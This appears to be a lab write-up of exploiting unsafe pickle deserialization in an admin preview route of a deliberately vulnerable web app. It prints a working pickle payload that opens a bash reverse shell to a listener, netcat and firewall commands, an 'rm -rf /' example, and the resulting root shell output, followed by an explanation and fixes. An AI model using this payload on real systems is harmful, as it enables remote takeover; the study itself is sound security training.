# remote code execution: unsafe pickle preview

the admin preview route runs `pickle.load()` on an uploaded file's raw bytes. pickle isn't a data format, it's an instruction format for rebuilding objects, and one of those instructions can be "call this function". so loading an attacker's file means running the attacker's code.

## the vulnerable flow

```text
upload any file (no validation) -> saved in /app/uploads -> path stored in posts
  -> admin opens preview -> preview opens the file -> pickle.load() executes it
```

the actual bug is one line in `logic/routes/admin.py`:

```python
with open(stored_file_path, "rb") as stored_file:
    loaded_object = pickle.load(stored_file)
```

`pickle.load` deserializes by replaying whatever instructions are in the byte stream: build this object, call this constructor, call this function. that last one is the whole exploit. the class making the request doesn't even need to exist on the server, pickle just needs `os.system` (or anything else) to be importable, which it always is.

## building the payload

```python
class whatever:
    def __reduce__(self):
        import os
        return (
            os.system,
            ('bash -c "bash -i >& /dev/tcp/172.18.0.1/4444 0>&1"',)
        )
```

`__reduce__` is pickle's hook for "here's how to rebuild me": return a callable and a tuple of args for it. normally that's something harmless like `(MyClass, (self.x, self.y))`. nothing stops it from being `(os.system, ("rm -rf /",))` instead, pickle doesn't know or care what the callable does, it just calls it.

`pickle.dumps(whatever())` runs `__reduce__` right then, on the attacker's machine, and bakes the result into the byte stream. the server never sees the class definition, only the instruction "call os.system with this string" baked into the pickle opcodes.

saved it as `evil.jpg`. the extension is pure camouflage, `/upload` doesn't check content or magic bytes, so a `.jpg` that's actually a pickle sails right through.

## network setup

host listener:

```bash
nc -lnvp 4444
```

the docker gateway (the ip the container uses to reach the host) was `172.18.0.1`. ufw was blocking traffic from the docker subnet by default, so the lab needed a scoped rule:

```bash
sudo ufw allow from 172.18.0.0/16 to any port 4444 proto tcp
```

confirmed the path works before touching the app at all:

```bash
docker exec vulnboard-web-1 python -c 'import socket; s=socket.create_connection(("172.18.0.1",4444),3); s.sendall(b"connected\n"); print("connected")'
```

worth doing this check separately: if the reverse shell fails later, you want to already know whether it's the network or the pickle.

## steps

1. generate the pickle with `writeups/rce/exploit.py`
2. start the listener on port 4444
3. register/login as a normal user, upload `evil.jpg` on a post
4. log in as `admin`
5. open that post's admin preview link
6. `pickle.load()` fires, calls `os.system`, bash connects back

## what came back

```text
Listening on 0.0.0.0 4444
Connection received on 172.18.0.3 33422
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@a0409df51b65:/app# id
uid=0(root) gid=0(root) groups=0(root)
root@a0409df51b65:/app# pwd
/app
root@a0409df51b65:/app# hostname
a0409df51b65
root@a0409df51b65:/app# ls /app/uploads
evil.jpg
```

```text
total 4
-rw-r--r-- 1 root root 88 Oct 31 15:25 evil.jpg
```

root inside the container, not root on the host, worth being precise about that distinction instead of overselling it. the ioctl/job control warnings are just `nc` not allocating a pty, the shell works fine, you just lose tab complete and ctrl+c sanity.

## why this actually works

two separate trust failures chain together here, neither is enough alone:

1. upload accepts anything, no type or content check
2. preview deserializes whatever's there with no check that it's safe

the admin gate on `/admin/preview/<id>` controls *who* can reach the route, not *what* the route does once they're there. that's a privilege boundary, not a data safety boundary, and pickle collapses that distinction completely: there's no such thing as a "safe pickle" from an untrusted source, the format itself is unsafe by design.

security angle worth internalizing: this is the general lesson behind every "don't deserialize untrusted data" warning you'll see for pickle, PHP's `unserialize`, Java's `ObjectInputStream`, YAML's unsafe loader. if load can call arbitrary code, "only admins can load it" doesn't help, admins are exactly who you handed code execution to.

## verification

| check | result |
|---|---|
| arbitrary file accepted by upload | confirmed |
| pickle generated | confirmed |
| container can reach host listener | confirmed |
| admin preview reaches `pickle.load()` | confirmed |
| reverse shell received | confirmed |
| command execution in web container | confirmed |
| shell identity | root, inside container |

## the actual fix (not implemented, exploitation only repo)

- never unpickle untrusted bytes. if you need a preview feature, parse known safe formats explicitly (PIL for images, not pickle for anything)
- if serialized python objects are unavoidable, `pickle` has no safe mode: swap to `json` or a schema-validated format instead
- validate upload content by magic bytes, not extension, and reject anything that isn't an expected type

## cleanup

```bash
sudo ufw delete allow from 172.18.0.0/16 to any port 4444 proto tcp
```